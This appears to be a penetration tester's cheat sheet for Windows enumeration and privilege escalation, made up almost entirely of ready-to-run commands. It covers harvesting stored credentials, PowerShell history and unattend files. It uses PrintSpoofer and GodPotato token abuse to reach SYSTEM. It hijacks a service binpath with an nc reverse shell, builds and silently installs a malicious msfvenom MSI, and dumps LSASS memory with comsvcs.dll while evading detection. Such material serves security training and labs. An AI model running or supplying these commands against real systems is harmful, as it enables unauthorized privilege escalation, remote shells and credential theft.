> [!note] Cheat Sheet: Windows Enum & PrivEsc (Privilege Escalation) #windows #privesc #enumeration #winpeas #impersonate

### 1. Initial Reconnaissance (Manual Collection)

Checking the current user and their privileges (search for `SeImpersonatePrivilege`):
```
whoami /priv
```

Checking the architecture, OS version, and patches:
```
systeminfo
```

Finding saved credentials in the system:
```
cmdkey /list
```

Finding the saved autologin password in the registry:
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultPassword"
```

### 2. Search for passwords and leaks in files

Reading PowerShell command history (often contains database or account passwords):
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Searching for OS installation files (Unattended Install), where admin passwords may be hardcoded:
```
dir /s /b /c c:\*unattend*.xml
type C:\Windows\Panther\unattend.xml
```

Global file search for keywords within text:
```
findstr /si password *.txt *.ini *.config *.xml
```

### 3. Automated reconnaissance

Running `winPEAS` and saving the report to a file (the console will truncate the long output):
```
winPEASany.exe > C:\Temp\peas.txt
```

### 4. Privilege Escalation Vectors (Exploitation)

**A. Token Attack (`SeImpersonatePrivilege`)** If the privilege is active, we get SYSTEM in a second. Via PrintSpoofer:
```
PrintSpoofer.exe -i -c cmd
```

Via GodPotato (for newer versions of Windows Server):
```
GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```

**B. Service Misconfigurations** Checking service executable permissions:
```
icacls "C:\Program Files\Vulnerable Software\service.exe"
```

Path substitution with a reverse shell:
```
sc config ServiceName binpath= "C:\Temp\nc.exe -e cmd.exe 10.10.14.10 4444"
```

Restarting the service:
```
net stop ServiceName
net start ServiceName
```

**B. AlwaysInstallElevated** Checking registry keys (if both return 0x1, it's vulnerable):
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Generating a malicious MSI package on Kali:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f msi -o reverse.msi
```

Installing the package on the victim (results in SYSTEM):
```
msiexec /quiet /qn /i C:\Temp\reverse.msi
```

### 5. LSASS Dump (Theft) Passwords from memory for Lateral Movement)

Find the PID of the lsass.exe process:
```
tasklist /fi "imagename eq lsass.exe"
```

Create a legitimate memory dump using the system library (bypass detection):
```
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full
```
